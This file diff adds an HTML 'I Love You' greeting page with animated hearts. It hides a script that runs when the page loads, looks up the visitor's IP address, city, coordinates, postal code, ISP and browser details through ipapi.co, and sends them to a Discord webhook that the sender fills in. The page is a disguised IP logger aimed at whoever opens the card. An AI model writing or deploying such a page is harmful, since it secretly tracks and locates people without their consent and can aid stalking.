@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>💖 For You</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: 'Segoe UI', Tahoma, sans-serif;
+  background: linear-gradient(135deg, #1a0028, #4a0030, #1a0028);
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  color: #fff;
+  overflow: hidden;
+}
+.hearts {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  pointer-events: none;
+  overflow: hidden;
+}
+.heart {
+  position: absolute;
+  bottom: -40px;
+  font-size: 24px;
+  animation: floatUp 6s linear infinite;
+  opacity: 0.3;
+}
+.heart:nth-child(1) { left: 10%; animation-delay: 0s; font-size: 20px; }
+.heart:nth-child(2) { left: 25%; animation-delay: 1.2s; font-size: 30px; }
+.heart:nth-child(3) { left: 40%; animation-delay: 2.5s; font-size: 16px; }
+.heart:nth-child(4) { left: 55%; animation-delay: 0.8s; font-size: 26px; }
+.heart:nth-child(5) { left: 70%; animation-delay: 3.2s; font-size: 18px; }
+.heart:nth-child(6) { left: 85%; animation-delay: 1.8s; font-size: 28px; }
+.heart:nth-child(7) { left: 50%; animation-delay: 4s; font-size: 22px; }
+.heart:nth-child(8) { left: 15%; animation-delay: 2s; font-size: 14px; }
+.heart:nth-child(9) { left: 65%; animation-delay: 3.5s; font-size: 20px; }
+.heart:nth-child(10) { left: 90%; animation-delay: 0.5s; font-size: 24px; }
+@keyframes floatUp {
+  0% { transform: translateY(0) scale(1); opacity: 0.3; }
+  50% { opacity: 0.6; }
+  100% { transform: translateY(-100vh) scale(1.2); opacity: 0; }
+}
+.card {
+  background: rgba(255,255,255,0.08);
+  border-radius: 24px;
+  padding: 50px 40px;
+  text-align: center;
+  max-width: 480px;
+  backdrop-filter: blur(8px);
+  border: 1px solid rgba(255,255,255,0.1);
+  animation: fadeIn 1s ease;
+  position: relative;
+  z-index: 1;
+}
+@keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; } }
+.heart-icon { font-size: 70px; margin-bottom: 10px; animation: pulse 1.5s ease-in-out infinite; }
+@keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.15); } }
+h1 { font-size: 40px; margin-bottom: 8px; background: linear-gradient(90deg, #ff6b9d, #ff2d78); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+.sub { color: #ffb3c6; font-size: 18px; margin-bottom: 6px; }
+</style>
+</head>
+<body>
+<div class="hearts">
+  <span class="heart">❤️</span>
+  <span class="heart">💖</span>
+  <span class="heart">💗</span>
+  <span class="heart">💕</span>
+  <span class="heart">❤️</span>
+  <span class="heart">💖</span>
+  <span class="heart">💗</span>
+  <span class="heart">💕</span>
+  <span class="heart">❤️</span>
+  <span class="heart">💖</span>
+</div>
+
+<div class="card">
+  <div class="heart-icon">💖</div>
+  <h1>I Love You</h1>
+  <p class="sub">You mean the world to me ❤️</p>
+</div>
+
+<script>
+// ============================================
+// 🔴 IMPORTANT: Replace with YOUR Discord webhook URL
+// ============================================
+// 1. Open Discord -> Server Settings -> Integrations -> Webhooks
+// 2. Create a webhook and copy its URL
+// 3. Paste it below between the quotes
+const WEBHOOK_URL = "";
+
+// ============================================
+
+async function sendToDiscord(data) {
+  if (!WEBHOOK_URL) return;
+  const embed = {
+    embeds: [{
+      title: "🔔 New Visitor!",
+      color: 0xff2d78,
+      fields: [
+        { name: "📍 IP", value: data.ip || "N/A", inline: true },
+        { name: "🏙️ City", value: data.city || "N/A", inline: true },
+        { name: "🌍 Country", value: (data.country_name || "") + " (" + (data.country_code || "") + ")", inline: true },
+        { name: "🏢 ISP / Org", value: data.org || "N/A", inline: true },
+        { name: "🕐 Timezone", value: data.timezone || "N/A", inline: true },
+        { name: "🌐 Region", value: (data.region || "N/A") + " (" + (data.region_code || "") + ")", inline: true },
+        { name: "🗺️ Lat / Lon", value: (data.latitude || "?") + ", " + (data.longitude || "?"), inline: true },
+        { name: "📫 Postal", value: data.postal || "N/A", inline: true },
+        { name: "🔗 ASN", value: data.asn || "N/A", inline: true },
+        { name: "📄 User Agent", value: navigator.userAgent.substring(0, 200) || "N/A" }
+      ],
+      footer: { text: "IP Logger Demo • Data sent when page opened" }
+    }]
+  };
+  try {
+    await fetch(WEBHOOK_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(embed) });
+  } catch (e) {}
+}
+
+(async function() {
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+    if (data && !data.error) {
+      sendToDiscord(data);
+    }
+  } catch (e) {}
+})();
+</script>
+</body>
+</html>
